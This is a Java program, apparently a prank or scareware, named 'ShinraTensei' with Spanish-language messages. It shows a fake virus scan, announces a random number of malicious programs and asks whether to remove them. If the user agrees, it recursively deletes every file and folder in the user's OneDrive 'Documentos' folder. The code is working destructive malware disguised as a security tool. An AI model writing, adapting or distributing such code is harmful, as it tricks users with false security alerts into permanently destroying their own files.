/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */


import java.io.File;
import java.io.IOException;
import java.nio.file.DirectoryIteratorException;
import java.nio.file.DirectoryStream;
import java.nio.file.FileSystems;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Random;
import java.util.Scanner;


public class ShinraTensei {

    public static void main(String[] args) throws InterruptedException {
        String usuario = System.getProperty("user.name");
        String base = "C:\\Users\\"+usuario+"\\OneDrive\\";
        String Variabletarget = "Documentos";
        Scanner S = new Scanner(System.in);
        Random gen = new Random();
        
        System.out.println("Escaneando el sistema en búsqueda de virus...");
        Thread.currentThread().sleep(2000);
        System.out.println("!!!!");
        System.out.println("Se encontraron "+gen.nextInt(30)+" programas maliciosos en tu ordenador.");
        
        
        System.out.println("Deseas realizar una eliminacion?[S/N]");
        String s = S.nextLine();
        System.out.println();
        
        if(s.equalsIgnoreCase("s"))
        {
            System.out.println("Perfecto, procediendo a eliminar todos tus archivos de Documentos :D");
            Path path = FileSystems.getDefault().getPath(base, Variabletarget);
            try (DirectoryStream<Path> stream = Files.newDirectoryStream(path)) 
            {
                 for (Path file: stream) 
                 {
                     System.out.println("DELETING -> "+file.toFile());
                     file.toFile().delete();
                     if(file.toFile().isDirectory())
                     {
                         deleteDir(file.toFile());
                     }
                 }
            }catch (IOException  | DirectoryIteratorException e) 
            {
                e.printStackTrace();
            }
            
        }else
        {
            System.out.println("Felicidades, sabes leer el nombre del programa.");
        }
        
        
    }
    
    public static void deleteDir(File dir) 
    {
        if (dir.isDirectory()) 
        {
            String[] children = dir.list();
            for (int i = 0; i < children.length; i++) 
                deleteDir(new File(dir, children[i]));                 
        }
        dir.delete();    
    }
}
